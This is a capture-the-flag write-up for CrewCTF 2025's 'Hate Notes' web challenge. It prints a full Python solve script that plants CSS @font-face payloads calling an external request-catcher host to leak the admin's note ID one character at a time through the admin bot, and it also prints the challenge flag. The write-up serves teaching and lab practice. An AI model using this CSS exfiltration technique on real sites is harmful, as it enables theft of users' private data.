# Hate Notes — CrewCTF 2025

> **Room / Challenge:** Hate Notes (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** CrewCTF 2025
- **Challenge:** Hate Notes (web)
- **Target / URL:** `https://hate-notes.chal.crewc.tf/`
- **Difficulty:** `Medium`
- **Points:** `426`
- **Tags:** web, xss, sqli, auth, enumeration
- **Date:** `21-09-2025`

---

## Goal

We have to get access to the flag `crew{...}` in the admin's note which the `bot` can view.

## My Solution

Love Notes and Hate Notes share 99% of their code, but Love Notes had many more solutions than Hate Notes: [My Solution for Love Notes](./love-notes.md)

You can download the source code of Hate Notes for further investigation: [Source Code](./hate-notes.tar.gz)

Hate Notes blocks all XSS Scripting or any kind of Javascript works in all pages of their website included the `/api/notes/<NOTE_ID>` which we can take advantage of in the Love Notes.

There is other solution for this we will do CSS Exfiltration, in this challenge font exfiltration is widely used to solve. You can take a look at this `solve.py` from the author `bubu` of the challenge. [Link](https://github.com/AlbertoFDR/CTF/blob/main/created-challs/CrewCTF-2025/hate-notes/solve.py)

```python
import json
import time
import random
import string
import requests

URL = "http://localhost:8000"

# Example:
#      f54dbf57-3317-4d6c-b903-bc56868fd728
EXFILTRATION = "https://player.requestcatcher.com/"
UID = ""

def register(user, password):
    r = requests.post(URL+'/api/auth/register', data={'email': user, 'password': password})


def login(user, password):
    r = requests.post(URL+'/api/auth/login', data={'email': user, 'password': password}, allow_redirects=False)
    return r.cookies["token"]


def first_payload(cookie):
    global UID
    payload = ""
    for letter in string.hexdigits[:16]:
        character = UID + letter
        payload += """
        @font-face {
          font-family: exfilFont"""+character+""";
          src: url(""" + EXFILTRATION +  """?id="""+character+""");
        }
        a[href^='/api/notes/""" + character + """'] {
          font-family: exfilFont"""+character+""";
        }
        """
    return json.loads(requests.post(URL+'/api/notes', cookies=cookie, data={'title':payload, 'content':' '}).text)["id"]

def second_payload(id, cookie):
    payload = f"""<link rel=stylesheet href="/static/api/notes/{id}"/>"""
    return json.loads(requests.post(URL+'/api/notes', cookies=cookie, data={'title':payload, 'content': ' '}).text)["id"]

def report(id, cookie):
    print(f"Reporting... {id}")
    r = requests.post(URL+'/report', cookies=cookie, data={'noteId': id})
    print(r.text)


USER = ''.join(random.choice(string.digits+string.ascii_letters) for _ in range(10))
PASSWORD = ''.join(random.choice(string.digits+string.ascii_letters) for _ in range(10))
print(f"USER {USER} -- PASSWORD {PASSWORD}")
register(USER, PASSWORD)
cookie = login(USER, PASSWORD)
while True:
    print(f"[X] UID: {UID}")
    id = first_payload({'token': cookie})
    id = second_payload(id, {'token': cookie})
    report(id, {'token': cookie})
    time.sleep(0.5)
    new_char = input("> ")
    UID += new_char
    if len(UID) in [8,13,18,23]:
        UID += '-'
```

In this method, we also use two note trick:

First note:

```
Title: @font-face (font exfiltration)
```

Second note:

```
Title: <link rel=stylesheet href="/static/api/notes/<FONT_EXFILTRATION_NOTE_ID>"/>
```

By this way, we can get the note id that contains the flag char by char. Then we can just simply type `/dashboard?reviewNote=<DISCOVERED_NOTE_ID>`.

You can get the flag `crew{now_you_solved_it_in_the_right_way_fBi4WVX1kGzPtavs}`.

## Lessons Learned

- CSS Exfiltration
